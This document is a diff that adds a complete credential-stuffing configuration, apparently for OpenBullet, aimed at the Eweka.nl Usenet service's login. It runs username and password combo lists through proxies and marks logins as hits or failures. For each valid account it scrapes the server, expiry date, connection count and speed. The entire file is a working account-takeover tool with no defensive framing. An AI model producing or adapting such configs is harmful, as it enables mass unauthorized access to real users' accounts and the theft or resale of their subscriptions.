@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Eweka.nl",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-02T02:26:57.2357144+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 3,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://www.eweka.nl/myeweka/auth.php?" AutoRedirect=TRUE 
+  CONTENT "u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "PHPSESSID: <PHPSESSID>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "0" 
+  KEYCHAIN Success OR 
+    KEY "1" 
+#GETACOUNT REQUEST GET "https://www.eweka.nl/myeweka/?p=account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "JSESSIONID: <PHPSESSID>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#SERVER PARSE "<SOURCE>" CSS "#main > div > table > tbody > tr > td:nth-child(2) > table > tbody > tr > td > table > tbody > tr:nth-child(4) > td:nth-child(2) > i" "innerHTML" 0 -> CAP "SERVER" "" "" 
+#VALID_UNTIL PARSE "<SOURCE>" CSS "#main > div > table > tbody > tr > td:nth-child(2) > table > tbody > tr > td > table > tbody > tr:nth-child(7) > td:nth-child(2)" "innerHTML" 0 -> CAP "Valid until" "" "" 
+#CONNECTIONS PARSE "<SOURCE>" CSS "#main > div > table > tbody > tr > td:nth-child(2) > table > tbody > tr > td > table > tbody > tr:nth-child(6) > td:nth-child(2)" "innerHTML" 0 -> CAP "Connections" "" "" 
+#SPEED PARSE "<SOURCE>" CSS "#main > div > table > tbody > tr > td:nth-child(2) > table > tbody > tr > td > table > tbody > tr:nth-child(8) > td:nth-child(2)" "innerHTML" 0 -> CAP "Speed" "" "" 
